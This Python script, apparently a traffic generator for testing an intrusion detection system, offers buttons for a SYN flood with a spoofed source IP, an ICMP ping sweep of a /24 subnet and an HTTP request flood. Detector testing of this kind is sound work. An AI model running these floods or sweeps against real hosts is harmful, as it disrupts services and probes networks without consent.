# attacker.py
import tkinter as tk
import requests
from scapy.all import IP, TCP, send , ICMP


# Define the IP and port of the listener
listener_ip = '192.168.0.14'
listener_port = 8080


def send_syn_flood():
    src_ip = '10.0.0.1'
    dst_ip = listener_ip
    packet = IP(src=src_ip, dst=dst_ip)/TCP(dport=listener_port, flags='S')
    send(packet, count=100)

def send_ping_sweep():
    for i in range(1, 256):
        dst_ip = f"192.168.1.{i}"
        packet = IP(dst=dst_ip)/ICMP()
        send(packet)

def send_http_flood():
    url = f"http://{listener_ip}:{listener_port}/"
    for _ in range(100):
        requests.get(url)

def attack_callback(attack_type):
    if attack_type == "SYN Flood":
        send_syn_flood()
    elif attack_type == "Ping Sweep":
        send_ping_sweep()
    elif attack_type == "HTTP Flood":
        send_http_flood()

# GUI setup
root = tk.Tk()
root.title("IDS Attacker")

tk.Label(root, text="Choose an attack to simulate:").pack(pady=10)

tk.Button(root, text="SYN Flood", command=lambda: attack_callback("SYN Flood")).pack(pady=5)
tk.Button(root, text="Ping Sweep", command=lambda: attack_callback("Ping Sweep")).pack(pady=5)
tk.Button(root, text="HTTP Flood", command=lambda: attack_callback("HTTP Flood")).pack(pady=5)

root.mainloop()
